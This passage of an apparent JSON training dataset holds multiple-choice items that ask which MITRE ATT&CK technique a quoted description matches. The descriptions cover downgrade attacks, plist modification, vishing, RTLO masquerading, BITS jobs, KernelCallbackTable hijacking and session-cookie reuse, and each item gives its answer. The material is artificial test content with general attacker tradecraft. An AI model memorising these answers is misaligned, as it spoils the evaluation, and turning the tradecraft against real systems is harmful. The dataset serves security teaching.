    "output": "B. Impair Defenses: Downgrade Attack",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system\u2019s backward compatibility to force it into less secure modes of operation. \n\nAdversaries may downgrade and use various less-secure versions of features of a system, such as Command and Scripting Interpreters or even network protocols that can be abused to enable Adversary-in-the-Middle or Network Sniffing. For example, PowerShell versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to Impair Defenses while running malicious scripts that may have otherwise been detected.\n\nAdversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.",
      "options": "A. Archive Collected Data: Archive via Utility, B. Impair Defenses: Downgrade Attack, C. Hijack Execution Flow: COR_PROFILER, D. Boot or Logon Initialization Scripts: Network Logon Script",
      "choice": "B. Impair Defenses: Downgrade Attack",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format. \n\nAdversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. Hidden Window) or running additional commands for persistence (ex: Launch Agent/Launch Daemon or Re-opened Applications).\n\nFor example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application\u2019s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via Dynamic Linker Hijacking.\nA. Proxy: Domain Fronting, B. Indirect Command Execution, C. Plist File Modification, D. Proxy: Multi-hop Proxy\nAnswer:",
    "context": "",
    "output": "C. Plist File Modification",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format. \n\nAdversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. Hidden Window) or running additional commands for persistence (ex: Launch Agent/Launch Daemon or Re-opened Applications).\n\nFor example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application\u2019s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via Dynamic Linker Hijacking.",
      "options": "A. Proxy: Domain Fronting, B. Indirect Command Execution, C. Plist File Modification, D. Proxy: Multi-hop Proxy",
      "choice": "C. Plist File Modification",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.\n\nAdversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to tailor pretexts to be even more persuasive and believable for the victim.\n\nPossible answers:\nA. Modify Authentication Process: Multi-Factor Authentication, B. Phishing for Information: Spearphishing Voice, C. Rootkit, D. Hide Artifacts: Email Hiding Rules",
    "context": "",
    "output": "B. Phishing for Information: Spearphishing Voice",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.\n\nAdversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to tailor pretexts to be even more persuasive and believable for the victim.",
      "options": "A. Modify Authentication Process: Multi-Factor Authentication, B. Phishing for Information: Spearphishing Voice, C. Rootkit, D. Hide Artifacts: Email Hiding Rules",
      "choice": "B. Phishing for Information: Spearphishing Voice",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. \n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell. Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and esentutl) to create shadow copies or backups of data from system volumes.\nA. OS Credential Dumping: DCSync, B. Impair Defenses: Disable or Modify Cloud Logs, C. Direct Volume Access, D. Server Software Component: Web Shell",
    "context": "",
    "output": "C. Direct Volume Access",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. \n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell. Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and esentutl) to create shadow copies or backups of data from system volumes.",
      "options": "A. OS Credential Dumping: DCSync, B. Impair Defenses: Disable or Modify Cloud Logs, C. Direct Volume Access, D. Server Software Component: Web Shell",
      "choice": "C. Direct Volume Access",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may the technique and use it during other phases of the adversary lifecycle. Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with Digital Certificates) to further blend in and support staged information gathering and/or Phishing campaigns. Additionally, adversaries may also the technique to support Proxy and/or proxyware services.\n\nBy using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.\n\nOptions:\nA. Office Application Startup, B. Search Victim-Owned Websites, C. Container and Resource Discovery, D. Compromise Infrastructure",
    "context": "",
    "output": "D. Compromise Infrastructure",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may the technique and use it during other phases of the adversary lifecycle. Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with Digital Certificates) to further blend in and support staged information gathering and/or Phishing campaigns. Additionally, adversaries may also the technique to support Proxy and/or proxyware services.\n\nBy using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.",
      "options": "A. Office Application Startup, B. Search Victim-Owned Websites, C. Container and Resource Discovery, D. Compromise Infrastructure",
      "choice": "D. Compromise Infrastructure",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.\n\nA. Credentials from Password Stores, B. Exfiltration Over Physical Medium: Exfiltration over USB, C. Compromise Infrastructure, D. Proxy: External Proxy\nAnswer:",
    "context": "",
    "output": "A. Credentials from Password Stores",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
      "options": "A. Credentials from Password Stores, B. Exfiltration Over Physical Medium: Exfiltration over USB, C. Compromise Infrastructure, D. Proxy: External Proxy",
      "choice": "A. Credentials from Password Stores",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).\n\nA. Input Capture, B. Office Application Startup: Outlook Home Page, C. Search Open Websites/Domains: Code Repositories, D. Obfuscated Files or Information: Command Obfuscation\nAnswer:",
    "context": "",
    "output": "A. Input Capture",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
      "options": "A. Input Capture, B. Office Application Startup: Outlook Home Page, C. Search Open Websites/Domains: Code Repositories, D. Obfuscated Files or Information: Command Obfuscation",
      "choice": "A. Input Capture",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page. These persistence mechanisms can work within Outlook or be used through Office 365.\nA. Hide Artifacts: Email Hiding Rules, B. Office Application Startup, C. Hide Artifacts: Process Argument Spoofing, D. System Time Discovery",
    "context": "",
    "output": "B. Office Application Startup",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page. These persistence mechanisms can work within Outlook or be used through Office 365.",
      "options": "A. Hide Artifacts: Email Hiding Rules, B. Office Application Startup, C. Hide Artifacts: Process Argument Spoofing, D. System Time Discovery",
      "choice": "B. Office Application Startup",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.\n\nAdversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity. RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.\n\nA. Gather Victim Host Information: Client Configurations, B. Boot or Logon Autostart Execution: Active Setup, C. Masquerading: Right-to-Left Override, D. System Binary Proxy Execution: Rundll32\nAnswer:",
    "context": "",
    "output": "C. Masquerading: Right-to-Left Override",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.\n\nAdversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity. RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",
      "options": "A. Gather Victim Host Information: Client Configurations, B. Boot or Logon Autostart Execution: Active Setup, C. Masquerading: Right-to-Left Override, D. System Binary Proxy Execution: Rundll32",
      "choice": "C. Masquerading: Right-to-Left Override",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities. Adversaries may likely also utilize the technique during Adversary-in-the-Middle (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic. The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.\n\nOn network devices, adversaries may perform network captures using Network Device CLI commands such as `monitor capture`.\n\nOptions:\nA. Server Software Component: IIS Components, B. Debugger Evasion, C. Process Injection: Proc Memory, D. Network Sniffing",
    "context": "",
    "output": "D. Network Sniffing",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities. Adversaries may likely also utilize the technique during Adversary-in-the-Middle (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic. The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.\n\nOn network devices, adversaries may perform network captures using Network Device CLI commands such as `monitor capture`.",
      "options": "A. Server Software Component: IIS Components, B. Debugger Evasion, C. Process Injection: Proc Memory, D. Network Sniffing",
      "choice": "D. Network Sniffing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.\n\nAdversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).\n\nBITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.\nA. User Execution: Malicious Link, B. Scheduled Transfer, C. Account Access Removal, D. BITS Jobs\nAnswer:",
    "context": "",
    "output": "D. BITS Jobs",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.\n\nAdversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).\n\nBITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.",
      "options": "A. User Execution: Malicious Link, B. Scheduled Transfer, C. Account Access Removal, D. BITS Jobs",
      "choice": "D. BITS Jobs",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads. The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.\n\nAn adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.\n\nA pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> Native API function). Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.\n\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload. Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.\n\nPossible answers:\nA. Data Manipulation, B. OS Credential Dumping: Security Account Manager, C. Remote Services: Remote Desktop Protocol, D. Hijack Execution Flow: KernelCallbackTable",
    "context": "",
    "output": "D. Hijack Execution Flow: KernelCallbackTable",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads. The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.\n\nAn adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.\n\nA pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> Native API function). Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.\n\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload. Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",
      "options": "A. Data Manipulation, B. OS Credential Dumping: Security Account Manager, C. Remote Services: Remote Desktop Protocol, D. Hijack Execution Flow: KernelCallbackTable",
      "choice": "D. Hijack Execution Flow: KernelCallbackTable",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.\n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through Steal Web Session Cookie or Web Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\n\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.\n\nA. Virtualization/Sandbox Evasion: User Activity Based Checks, B. Modify System Image: Downgrade System Image, C. Process Injection: Extra Window Memory Injection, D. Use Alternate Authentication Material: Web Session Cookie\nAnswer:",
    "context": "",
    "output": "D. Use Alternate Authentication Material: Web Session Cookie",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.\n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through Steal Web Session Cookie or Web Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\n\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.",
      "options": "A. Virtualization/Sandbox Evasion: User Activity Based Checks, B. Modify System Image: Downgrade System Image, C. Process Injection: Extra Window Memory Injection, D. Use Alternate Authentication Material: Web Session Cookie",
      "choice": "D. Use Alternate Authentication Material: Web Session Cookie",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\nA. File and Directory Permissions Modification: Windows File and Directory Permissions Modification, B. Web Service: Bidirectional Communication, C. Account Access Removal, D. Endpoint Denial of Service: OS Exhaustion Flood",
    "context": "",
    "output": "A. File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",
      "options": "A. File and Directory Permissions Modification: Windows File and Directory Permissions Modification, B. Web Service: Bidirectional Communication, C. Account Access Removal, D. Endpoint Denial of Service: OS Exhaustion Flood",
      "choice": "A. File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.\n\nA. Application Layer Protocol: Web Protocols, B. Supply Chain Compromise: Compromise Software Supply Chain, C. Exfiltration Over Web Service: Exfiltration Over Webhook, D. System Binary Proxy Execution: CMSTP\nA:",
    "context": "",
    "output": "B. Supply Chain Compromise: Compromise Software Supply Chain",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.",
      "options": "A. Application Layer Protocol: Web Protocols, B. Supply Chain Compromise: Compromise Software Supply Chain, C. Exfiltration Over Web Service: Exfiltration Over Webhook, D. System Binary Proxy Execution: CMSTP",
